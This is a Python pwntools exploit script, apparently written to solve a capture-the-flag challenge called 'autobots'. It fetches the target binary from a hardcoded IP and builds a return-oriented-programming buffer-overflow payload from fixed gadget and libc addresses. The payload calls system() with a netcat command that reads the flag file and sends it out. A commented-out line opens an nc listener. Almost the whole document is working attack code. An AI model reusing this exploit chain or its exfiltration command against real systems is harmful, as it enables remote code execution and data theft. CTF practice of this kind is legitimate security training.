#!/usr/bin/env python
#encoding:utf-8

import re

from utils import *

ip = '52.20.10.244'
fd = 6
# exp_cmd = 'cat flag.txt | nc -l -p 12345'
exp_cmd = 'cat flag | nc 11111'
pop_rdi_addr = 0x00000000004008d3
pop_rsi_addr = 0x00000000004008d1
libc_base = 0x7ffff7b00860-0x00000000000EB860
pop_rdx_ret = 0x0000000000001b8e + libc_base
pop_rdx_rsi_ret = 0x0000000000108169 + libc_base
system_addr = 0x0000000000046640 + libc_base
fd_addr = 0x7fffffffecc8

def get_elf():
    # global ip, fd, fd_addr
    # ip = '10.211.55.43'
    # fd = 4
    # # fd_addr = 0x7fffffffe418
    # fd_addr = 0x7fffffffe468
    # return ELF('./autobots')
    io = remote(ip, 8888)
    write('elf', io.recvall())
    return ELF('elf')

context(arch='amd64', log_level='debug')
set_pad_char('A')

elf = get_elf()

cmd = elf.disasm(0x0000000000400824, 7)
log.info(cmd)
buf_len = int(re.search('-(0x[a-z0-9]+)]', cmd).group(1), 16)

cmd = elf.disasm(0x000000000040082E, 5)
log.info(cmd)
read_len = int(re.search(',(0x[a-z0-9]+)', cmd).group(1), 16)

port = u16(elf.read(0x00000000004007D5, 2))
log.info('Port: %d' % port)

log.info(elf.disasm(pop_rdi_addr, 2))
log.info(elf.disasm(pop_rsi_addr, 4))

payload = p64(0)

# Get libc base (write is 0x7ffff7b00860)
# payload += p64(pop_rsi_addr) + p64(elf.got['write']) + p64(0)
# payload += p64(elf.plt['write'])

# buf end at 0x7fffffffecc8
# payload += p64(pop_rdx_rsi_ret) + p64(0x1000) + p64(0x7fffffffe000)
# payload += p64(elf.plt['write'])

payload += p64(pop_rdi_addr) + '{{hold}}'
payload += p64(system_addr) * 2
exp_cmd_addr = fd_addr + 8 + len(payload)
payload = payload.replace('{{hold}}', p64(exp_cmd_addr))
log.debug('Addr: 0x%08x' % exp_cmd_addr)
payload += exp_cmd + '\x00'

assert(buf_len + len(payload) < read_len)

io = remote(ip, port)

payload = nops(buf_len - 8) + p32(fd) + nops(4) + payload

io.send(payload)
# io.close()
print io.recvall()

# io = remote(ip, 12345)
# log.success(io.recvall())
